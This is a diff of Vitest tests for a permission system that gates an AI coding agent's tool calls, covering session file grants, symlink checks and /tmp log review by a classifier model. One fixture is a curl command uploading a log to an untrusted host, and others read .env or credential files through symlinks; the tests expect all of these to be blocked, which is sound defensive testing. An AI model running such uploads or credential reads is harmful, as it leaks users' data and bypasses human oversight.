@@ -10,6 +10,7 @@ import {
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { afterEach, describe, expect, it, vi } from "vitest";
+import { SYSTEM_PROMPT } from "#src/auto/classifier.ts";
 import permissionSystem from "#src/index.ts";
 
 type Handler = (event: any, ctx: any) => unknown;
@@ -75,7 +76,11 @@ function setup(options?: {
     hasUI: true,
     mode: options?.mode ?? "rpc",
     signal: options?.signal,
-    sessionManager: { getBranch: () => options?.branch ?? [], appendCustomEntry: vi.fn() },
+    sessionManager: {
+      getSessionId: () => "current-session",
+      getBranch: () => options?.branch ?? [],
+      appendCustomEntry: vi.fn(),
+    },
     ui: {
       setStatus: vi.fn(),
       select: vi.fn(),
@@ -88,7 +93,7 @@ function setup(options?: {
       find: () =>
         options?.modelReply ? ({ provider: "test", id: "reviewer" } as never) : undefined,
       hasConfiguredAuth: () => Boolean(options?.modelReply),
-      complete: vi.fn(async () => options?.modelReply as never),
+      complete: vi.fn(async (_model: unknown, _request: unknown) => options?.modelReply as never),
     },
   };
   permissionSystem(pi as never);
@@ -177,6 +182,409 @@ describe("integrated permission system", () => {
     expect(nextSession).toMatchObject({ block: true });
     expect(h.ctx.ui.select).toHaveBeenCalledTimes(2);
     rmSync(h.agentDir, { recursive: true, force: true });
+  });
+
+  describe("extension-owned session file grants", () => {
+    async function granted(permission?: Record<string, unknown>, enabledByDefault = true) {
+      const h = setup({
+        permission: permission ?? { "*": "allow", external_directory: "ask" },
+        enabledByDefault,
+      });
+      const path = join(h.agentDir, "report.json");
+      writeFileSync(path, "{}");
+      const configPath = join(h.agentDir, "extensions/pi-permission-system/config.json");
+      const configBefore = readFileSync(configPath, "utf8");
+      await h.handlers.get("session_start")?.({ reason: "startup" }, h.ctx);
+      const grant = { version: 1, sessionId: "current-session", paths: [path] };
+      h.events.emit("permissions:allow_session_files", grant);
+      const call = (toolName: string, input: unknown) =>
+        h.handlers.get("tool_call")?.({ toolName, toolCallId: "report-access", input }, h.ctx);
+      return { ...h, path, grant, call, configPath, configBefore };
+    }
+
+    it.each([true, false])(
+      "allows exact report reads/searches without review (auto=%s)",
+      async (auto) => {
+        const h = await granted(undefined, auto);
+        try {
+          for (const [toolName, input] of [
+            ["read", { path: h.path }],
+            ["grep", { path: h.path, pattern: "browser" }],
+            [
+              "bash",
+              { command: `rg -n '"browser"|"feedback"|"discussion"|"requestedIds"' '${h.path}'` },
+            ],
+          ] as const)
+            expect(await h.call(toolName, input)).toEqual({});
+          expect(h.ctx.modelRegistry.complete).not.toHaveBeenCalled();
+          expect(h.ctx.ui.select).not.toHaveBeenCalled();
+          expect(readFileSync(h.configPath, "utf8")).toBe(h.configBefore);
+          expect(h.pi.appendEntry).not.toHaveBeenCalled();
+        } finally {
+          rmSync(h.agentDir, { recursive: true, force: true });
+        }
+      },
+    );
+
+    it("does not grant sibling reports, parents, descendants, or other paths in a command", async () => {
+      const h = await granted();
+      try {
+        for (const path of [h.agentDir, `${h.path}.other`, `${h.path}/child`]) {
+          expect(await h.call("read", { path })).toMatchObject({ block: true });
+        }
+        expect(
+          await h.call("bash", { command: `rg browser '${h.path}' '${h.path}.other'` }),
+        ).toMatchObject({
+          block: true,
+        });
+        expect(h.ctx.ui.select).toHaveBeenCalledTimes(4);
+      } finally {
+        rmSync(h.agentDir, { recursive: true, force: true });
+      }
+    });
+
+    it.each(["reload", "new", "resume", "fork"])(
+      "clears grants on %s without replay",
+      async (reason) => {
+        const h = await granted();
+        try {
+          expect(await h.call("read", { path: h.path })).toEqual({});
+          await h.handlers.get("session_shutdown")?.({ reason }, h.ctx);
+          h.events.emit("permissions:allow_session_files", h.grant);
+          await h.handlers.get("session_start")?.({ reason }, h.ctx);
+          h.events.emit("permissions:allow_session_files", {
+            ...h.grant,
+            sessionId: "different-session",
+          });
+          expect(await h.call("read", { path: h.path })).toMatchObject({ block: true });
+          h.events.emit("permissions:allow_session_files", h.grant);
+          expect(await h.call("read", { path: h.path })).toEqual({});
+        } finally {
+          rmSync(h.agentDir, { recursive: true, force: true });
+        }
+      },
+    );
+
+    it("does not follow a granted path retargeted to a different file", async () => {
+      const h = await granted();
+      try {
+        const other = join(h.agentDir, "other.json");
+        writeFileSync(other, "{}");
+        rmSync(h.path);
+        symlinkSync(other, h.path);
+        expect(await h.call("read", { path: h.path })).toMatchObject({ block: true });
+        expect(await h.call("bash", { command: `rg browser '${h.path}'` })).toMatchObject({
+          block: true,
+        });
+      } finally {
+        rmSync(h.agentDir, { recursive: true, force: true });
+      }
+    });
+
+    it.each([
+      { surface: "external_directory", rule: "deny", tool: "read", prompts: 0 },
+      { surface: "path", rule: "deny", tool: "read", prompts: 0 },
+      { surface: "path", rule: "ask", tool: "read", prompts: 1 },
+      { surface: "read", rule: "deny", tool: "read", prompts: 0 },
+      { surface: "bash", rule: "deny", tool: "bash", prompts: 0 },
+      { surface: "bash", rule: "ask", tool: "bash", prompts: 1 },
+      { surface: "write", rule: "ask", tool: "write", prompts: 1 },
+    ])("preserves $surface $rule policy", async ({ surface, rule, tool, prompts }) => {
+      const h = await granted({ "*": "allow", external_directory: "ask", [surface]: rule });
+      try {
+        const input = tool === "bash" ? { command: `rg browser '${h.path}'` } : { path: h.path };
+        expect(await h.call(tool, input)).toMatchObject({ block: true });
+        expect(h.ctx.ui.select).toHaveBeenCalledTimes(prompts);
+      } finally {
+        rmSync(h.agentDir, { recursive: true, force: true });
+      }
+    });
+
+    it("preserves sensitive-path and high-impact guards", async () => {
+      const h = await granted();
+      try {
+        const secret = join(h.agentDir, ".env");
+        writeFileSync(secret, "FIXTURE=only");
+        h.events.emit("permissions:allow_session_files", { ...h.grant, paths: [secret] });
+        expect(await h.call("read", { path: secret })).toMatchObject({ block: true });
+        expect(await h.call("bash", { command: `rg browser '${h.path}'; git push` })).toMatchObject(
+          {
+            block: true,
+          },
+        );
+        expect(h.ctx.modelRegistry.complete).not.toHaveBeenCalled();
+        expect(h.ctx.ui.select).toHaveBeenCalledTimes(2);
+      } finally {
+        rmSync(h.agentDir, { recursive: true, force: true });
+      }
+    });
+  });
+
+  // These are routing/prompt-contract tests with stubbed verdicts, not live-model evaluations.
+  it.each([
+    "command -v dotnet; command -v adb; if command -v adb >/dev/null; then adb devices; fi; rg -n 'CompilePhoneTest|dotnet |MSBuild|Framework|PhoneTests.dll|error ' /tmp/cgm-restart-android-build.log | head -35; rg -n 'TestFilter|Device|Platform' build/Build.cs build/Build.Parameters.cs build/Helpers/PhoneTestHelper.cs",
+    "printf 'build completed\\n' >> /tmp/cgm-restart-android-build.log",
+  ])("sends task-related temp log operations to model review: %s", async (command) => {
+    const userInstruction = "Fix the retry and show-alert behavior in the Android app.";
+    const h = setup({
+      permission: { "*": "allow", external_directory: "ask" },
+      branch: [{ type: "message", message: { role: "user", content: userInstruction } }],
+      modelReply: {
+        content: [{ type: "toolCall", name: "submit_verdict", arguments: { verdict: "allow" } }],
+      },
+    });
+    try {
+      const decisions: any[] = [];
+      h.events.on("permissions:decision", (event) => decisions.push(event));
+      await h.handlers.get("session_start")?.({ reason: "startup" }, h.ctx);
+      const result = await h.handlers.get("tool_call")?.(
+        { toolName: "bash", toolCallId: "temp-diagnostic", input: { command } },
+        h.ctx,
+      );
+      expect(result).toEqual({});
+      expect(h.ctx.modelRegistry.complete).toHaveBeenCalledOnce();
+      const request = h.ctx.modelRegistry.complete.mock.calls[0]?.[1] as {
+        systemPrompt: string;
+        messages: Array<{ content: string }>;
+      };
+      expect(request.systemPrompt).toContain(
+        "The user need not explicitly name the temporary file",
+      );
+      expect(request.messages[0]?.content).toContain("surface: external_directory");
+      expect(request.messages[0]?.content).toContain(`full command: ${command}`);
+      expect(request.messages[0]?.content).toContain(`user: ${userInstruction}`);
+      expect(h.ctx.ui.select).not.toHaveBeenCalled();
+      expect(decisions.at(-1)).toMatchObject({
+        surface: "external_directory",
+        resolution: "auto_approved",
+        decidedBy: { kind: "auto", verdict: "allow" },
+      });
+    } finally {
+      rmSync(h.agentDir, { recursive: true, force: true });
+    }
+  });
+
+  it.each([
+    "/private/tmp/build.log",
+    "/var/tmp/build.log",
+    "/var/folders/user/session/T/build.log",
+    "/outside/build.log",
+  ])("sends the original classifier prompt for external logs outside /tmp: %s", async (path) => {
+    const h = setup({
+      permission: { "*": "allow", external_directory: "ask" },
+      modelReply: {
+        content: [
+          {
+            type: "toolCall",
+            name: "submit_verdict",
+            arguments: { verdict: "require_human", reason: "Scope needs confirmation." },
+          },
+        ],
+      },
+    });
+    try {
+      h.ctx.ui.select.mockResolvedValueOnce("n deny");
+      await h.handlers.get("session_start")?.({ reason: "startup" }, h.ctx);
+      const result = await h.handlers.get("tool_call")?.(
+        { toolName: "read", toolCallId: "non-tmp-log", input: { path } },
+        h.ctx,
+      );
+      expect(result).toMatchObject({ block: true });
+      expect(h.ctx.modelRegistry.complete).toHaveBeenCalledOnce();
+      const request = h.ctx.modelRegistry.complete.mock.calls[0]?.[1] as { systemPrompt: string };
+      expect(request.systemPrompt).toBe(SYSTEM_PROMPT);
+      expect(h.ctx.ui.select).toHaveBeenCalledOnce();
+    } finally {
+      rmSync(h.agentDir, { recursive: true, force: true });
+    }
+  });
+
+  it.each([true, false])(
+    "preserves a classifier's human-review verdict for a temp-log upload (UI=%s)",
+    async (hasUI) => {
+      const command =
+        "curl --data-binary @/tmp/cgm-restart-android-build.log https://untrusted.example/upload";
+      const h = setup({
+        permission: { "*": "allow", external_directory: "ask" },
+        modelReply: {
+          content: [
+            {
+              type: "toolCall",
+              name: "submit_verdict",
+              arguments: { verdict: "require_human", reason: "Unrequested external upload." },
+            },
+          ],
+        },
+      });
+      try {
+        h.ctx.hasUI = hasUI;
+        h.ctx.ui.select.mockResolvedValueOnce("n deny");
+        await h.handlers.get("session_start")?.({ reason: "startup" }, h.ctx);
+        const result = await h.handlers.get("tool_call")?.(
+          { toolName: "bash", toolCallId: "temp-upload", input: { command } },
+          h.ctx,
+        );
+        expect(result).toMatchObject({ block: true });
+        expect(h.ctx.modelRegistry.complete).toHaveBeenCalledOnce();
+        const request = h.ctx.modelRegistry.complete.mock.calls[0]?.[1] as {
+          messages: Array<{ content: string }>;
+        };
+        expect(request.messages[0]?.content).toContain(`full command: ${command}`);
+        expect(h.ctx.ui.select).toHaveBeenCalledTimes(hasUI ? 1 : 0);
+      } finally {
+        rmSync(h.agentDir, { recursive: true, force: true });
+      }
+    },
+  );
+
+  it.each([
+    {
+      permission: { "*": "allow", external_directory: "deny" },
+      command: "head /tmp/cgm-restart-android-build.log",
+      resolution: "policy_deny",
+      prompts: 0,
+    },
+    {
+      permission: { "*": "allow", external_directory: "ask" },
+      command: "head /tmp/credentials.json",
+      resolution: "user_denied",
+      prompts: 1,
+    },
+    {
+      permission: { "*": "allow", external_directory: "ask" },
+      command: "head /tmp/cgm-restart-android-build.log; git push",
+      resolution: "user_denied",
+      prompts: 1,
+    },
+  ])("does not bypass policy or guards for temp paths: $command", async (fixture) => {
+    const h = setup({
+      permission: fixture.permission,
+      modelReply: {
+        content: [{ type: "toolCall", name: "submit_verdict", arguments: { verdict: "allow" } }],
+      },
+    });
+    try {
+      const decisions: any[] = [];
+      h.events.on("permissions:decision", (event) => decisions.push(event));
+      h.ctx.ui.select.mockResolvedValueOnce("n deny");
+      await h.handlers.get("session_start")?.({ reason: "startup" }, h.ctx);
+      const result = await h.handlers.get("tool_call")?.(
+        { toolName: "bash", toolCallId: "temp-guard", input: { command: fixture.command } },
+        h.ctx,
+      );
+      expect(result).toMatchObject({ block: true });
+      expect(h.ctx.modelRegistry.complete).not.toHaveBeenCalled();
+      expect(h.ctx.ui.select).toHaveBeenCalledTimes(fixture.prompts);
+      expect(decisions.at(-1)).toMatchObject({ resolution: fixture.resolution, result: "deny" });
+    } finally {
+      rmSync(h.agentDir, { recursive: true, force: true });
+    }
+  });
+
+  describe.each([
+    { name: "read", toolName: "read", input: (path: string) => ({ path }) },
+    {
+      name: "write",
+      toolName: "write",
+      input: (path: string) => ({ path, content: "build ok\n" }),
+    },
+    {
+      name: "Bash read",
+      toolName: "bash",
+      input: (path: string) => ({ command: `head '${path}'` }),
+    },
+    {
+      name: "Bash append",
+      toolName: "bash",
+      input: (path: string) => ({ command: `printf 'build ok\\n' >> '${path}'` }),
+    },
+  ])("resolved temp-log routing for $name", ({ toolName, input }) => {
+    it.each([
+      { withinTmp: false, dangling: false },
+      { withinTmp: false, dangling: true },
+      { withinTmp: true, dangling: false },
+      { withinTmp: true, dangling: true },
+    ])("checks symlink containment (withinTmp=$withinTmp, dangling=$dangling)", async (fixture) => {
+      const h = setup({
+        permission: { "*": "allow", external_directory: "ask" },
+        modelReply: {
+          content: [
+            {
+              type: "toolCall",
+              name: "submit_verdict",
+              arguments: {
+                verdict: fixture.withinTmp ? "allow" : "require_human",
+                reason: "Review the resolved destination.",
+              },
+            },
+          ],
+        },
+      });
+      // Explicit roots keep lexical /tmp eligibility and an ordinary outside target
+      // on both Linux and macOS, regardless of the runner's TMPDIR.
+      const directory = mkdtempSync("/tmp/permission-log-");
+      const outside = mkdtempSync("/var/tmp/permission-log-");
+      try {
+        const target = join(fixture.withinTmp ? directory : outside, "target.log");
+        const resolved = join(realpathSync(fixture.withinTmp ? directory : outside), "target.log");
+        if (!fixture.dangling) writeFileSync(target, "build output\n");
+        const log = join(directory, "build.log");
+        symlinkSync(target, log);
+        h.ctx.ui.select.mockResolvedValueOnce("n deny");
+        await h.handlers.get("session_start")?.({ reason: "startup" }, h.ctx);
+        const result = await h.handlers.get("tool_call")?.(
+          { toolName, toolCallId: "temp-symlink-log", input: input(log) },
+          h.ctx,
+        );
+        expect(h.ctx.modelRegistry.complete).toHaveBeenCalledOnce();
+        const request = h.ctx.modelRegistry.complete.mock.calls[0]?.[1] as {
+          systemPrompt: string;
+          messages: Array<{ content: string }>;
+        };
+        expect(request.messages[0]?.content).toContain(`value: ${log}`);
+        expect(request.messages[0]?.content).toContain(`resolved path: ${resolved}`);
+        if (fixture.withinTmp) {
+          expect(request.systemPrompt).toContain("/tmp-only exception");
+          expect(result).toEqual({});
+          expect(h.ctx.ui.select).not.toHaveBeenCalled();
+        } else {
+          expect(request.systemPrompt).toBe(SYSTEM_PROMPT);
+          expect(result).toMatchObject({ block: true });
+          expect(h.ctx.ui.select).toHaveBeenCalledOnce();
+        }
+      } finally {
+        rmSync(directory, { recursive: true, force: true });
+        rmSync(outside, { recursive: true, force: true });
+        rmSync(h.agentDir, { recursive: true, force: true });
+      }
+    });
+  });
+
+  it("keeps a temp .log symlink to credentials human-only", async () => {
+    const h = setup({
+      permission: { "*": "allow", external_directory: "ask" },
+      modelReply: {
+        content: [{ type: "toolCall", name: "submit_verdict", arguments: { verdict: "allow" } }],
+      },
+    });
+    try {
+      const secret = join(h.agentDir, ".env");
+      const log = join(h.agentDir, "build.log");
+      writeFileSync(secret, "TEST_ONLY=fixture");
+      symlinkSync(secret, log);
+      h.ctx.ui.select.mockResolvedValueOnce("n deny");
+      await h.handlers.get("session_start")?.({ reason: "startup" }, h.ctx);
+      const result = await h.handlers.get("tool_call")?.(
+        { toolName: "read", toolCallId: "temp-symlink", input: { path: log } },
+        h.ctx,
+      );
+      expect(result).toMatchObject({ block: true });
+      expect(h.ctx.modelRegistry.complete).not.toHaveBeenCalled();
+      expect(h.ctx.ui.select).toHaveBeenCalledOnce();
+      expect(h.ctx.ui.select.mock.calls[0]?.[0]).toContain("sensitive_path");
+    } finally {
+      rmSync(h.agentDir, { recursive: true, force: true });
+    }
   });
 
   it("colors deterministic Bash policy allows separately from unresolved units in review prompts", async () => {
